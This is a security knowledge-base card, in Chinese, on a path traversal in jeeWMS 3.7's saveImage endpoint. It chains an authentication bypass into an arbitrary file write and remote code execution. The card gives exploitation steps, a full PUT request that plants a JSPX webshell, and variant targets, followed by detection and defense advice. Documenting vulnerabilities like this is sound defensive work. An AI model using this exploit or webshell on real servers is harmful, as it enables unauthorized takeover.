---
id: web-generic-file-upload-jeewms-tokencontroller-saveimage-traversal
title: jeeWMS TokenController saveImage 的 fileAddr 路径穿越导致 PUT 任意文件写与 JSPX RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: put-fileaddr-path-traversal-write
tags:
- jeewms
- java
- put
- path-traversal
- arbitrary-file-write
- webshell
- jspx
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: jeeWMS 3.7（原文复现 commit 580e924afed5a...）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V39
  verified_at: '2026-11-05T06:28:02+08:00'
  notes: 已对照原文与43张图核对：saveImage PUT、imageFileName/fileAddr 参数（图25）、webUploadpath 调试值 C://upFiles（图26）、fileAddr 拼接后 getCanonicalPath 未回校验边界（图28）、fileAddr=../../webapps/jeewms 写入 pwn.jspx 后访问返回 RCE_OK root（图29）。未验证点：PoC 未本机复跑；原文未给文件覆盖/权限失败分支。原文明确版本 3.7，affected_versions 保留；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-upload/web-generic-file-upload-jeewms-tokencontroller-saveimage-traversal/
draft: false
kb_aliases:
- jeeWMS saveImage 穿越
- TokenController 任意文件写
- jeeWMS PUT 上传
- fileAddr 路径穿越
- webUploadpath 穿越
---

## 一句话结论

jeeWMS 的 `TokenController.saveImage` 接收 PUT 请求，把用户可控的 `fileAddr` 直接拼到配置项 `webUploadpath` 后并 `mkdirs()`/`getCanonicalPath()`，随后用 `new FileOutputStream(fileAddr + "/" + imageFileName)` 写入；`fileAddr=../../webapps/jeewms` 即可跳出上传目录，把 `pwn.jspx` 写到 Tomcat Web 根，配合鉴权绕过实现未授权 RCE。

## 原理

- `saveImage` 映射为 `@RequestMapping(value="/saveImage", method=RequestMethod.PUT)`，参数 `imageFileName` 与 `fileAddr` 均来自请求。
- 代码先执行 `fileAddr = ResourceUtil.getConfigByName("webUploadpath") + File.separator + fileAddr`；调试显示 `webUploadpath=C:/upFiles`，在 Linux 上 `C:/upFiles` 被当作相对路径 `C:/upFiles`（即当前工作目录下的 `C:` 目录），因此 `fileAddr` 可以相对它继续 `../`。
- 随后 `new File(fileAddr).mkdirs()`、`f.getCanonicalPath()`，但规范化结果只被赋值回 `fileAddr`，**没有校验它是否仍位于 `webUploadpath` 之下**；最终 `new FileOutputStream(fileAddr + File.separator + fileName)` 按规范化后的路径写入。
- `imageFileName` 也没有扩展名白名单，`pwn.jspx` 直接落盘；Tomcat 默认 JSP Servlet 映射 `*.jsp` 与 `*.jspx`，因此可执行。
- 入口鉴权同样可绕过：PUT 的参数必须放在 URL（无请求体），所以用 `?wmsApiController.do=1` 命中 `excludeContainUrls` 子串；或使用 `/wmsApiController.do/../tokens/saveImage.do` 路径穿越。
- 该链不依赖文件上传解析，只要求进程对目标目录有写权限，属于“任意路径写 + Web 可执行后缀”的组合。

## 触发条件

- jeeWMS 3.7，`TokenController` 暴露 `/tokens/saveImage.do`。
- 鉴权绕过可用（`?wmsApiController.do=1` 或路径穿越）。
- 进程对 `webUploadpath` 及穿越目标目录（如 Tomcat `webapps/jeewms`）有写权限。
- 目标容器解析 `.jspx`（Tomcat 默认支持）或写入其它可执行/可加载文件。

## 利用步骤

1. 确认 `/jeewms/tokens/saveImage.do` 存在且接受 PUT；构造带 `wmsApiController.do` 的 query 绕过拦截器。
2. 计算 `fileAddr`：从 `webUploadpath`（如 `C:/upFiles` 或 `upFiles`）相对跳到 `webapps/jeewms`。原文在容器内使用 `fileAddr=../../webapps/jeewms`。
3. 设置 `imageFileName=pwn.jspx`，请求体放 JSPX WebShell。
4. 发送 PUT 请求，服务端 `mkdirs` 创建目标目录并写入文件。
5. 访问 `/jeewms/pwn.jspx?cmd=whoami` 验证命令执行。
6. 若目标目录不可写，尝试其它可写且可执行的路径（其它 Web 应用目录、Tomcat 配置目录、计划任务）。

## PoC

```http
PUT /jeewms/tokens/saveImage.do?wmsApiController.do=1&imageFileName=pwn.jspx&fileAddr=../../webapps/jeewms HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 849

<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:directive.page import="java.io.*" contentType="text/plain;charset=UTF-8"/>
<jsp:scriptlet>
out.println("RCE_OK");
String cmd = request.getParameter("cmd");
if (cmd != null &amp;&amp; cmd.length() &gt; 0) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
    String line;
    while ((line = r.readLine()) != null) out.println(line);
}
</jsp:scriptlet>
</jsp:root>
```

验证：`GET /jeewms/pwn.jspx?cmd=whoami` 返回 `RCE_OK` 与 `root`。

## 变体与关联

- 穿越参数变体：`fileAddr` 用多级 `../`、绝对路径（若 `File` 拼接接受）、Windows 盘符；`imageFileName` 用 `..%2f` 编码。
- 目标变体：写入 Web 根 `.jspx/.jsp`、Tomcat `conf/Catalina/localhost/*.xml`、`WEB-INF/classes` 下的 class/配置、cron/启动脚本。
- 鉴权变体：`/wmsApiController.do/../tokens/saveImage.do`；或其它 `excludeContainUrls` 子串。
- 关联卡片：[[web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass]]、[[web-generic-file-upload-jeewms-cgupload-extension-upload]]、[[web-generic-file-upload-langflow-v2-filename-traversal-arbitrary-write]]。
- 关联：任意文件写升级 RCE 的通用路径（Web 目录、配置、计划任务）。

## 检测与防御

- 检测：PUT `/tokens/saveImage.do` 且 query 含 `wmsApiController.do`；`fileAddr` 含 `..`、绝对路径或编码分隔符；`imageFileName` 为 `.jsp/.jspx/.jspf/.xml`。
- 检测：`webUploadpath` 之外出现新建目录/文件；Web 根目录出现异常脚本；`getCanonicalPath` 后路径与基础目录不匹配。
- 防御：写入前 `Path.resolve().normalize()` 并校验 `startsWith(webUploadpath)`；`fileAddr` 只允许服务端生成的子目录名，禁止 `..` 与路径分隔符。
- 防御：上传文件名强制安全后缀（白名单），存储目录移出 Web 根并禁止脚本解析；PUT 接口要求认证与权限。
- 加固：修复鉴权绕过；限制 `TokenController` 暴露面；对上传目录做只读挂载或独立存储。
- 响应：删除异常脚本与目录、审计 PUT 请求日志、轮换可能泄露的凭据。
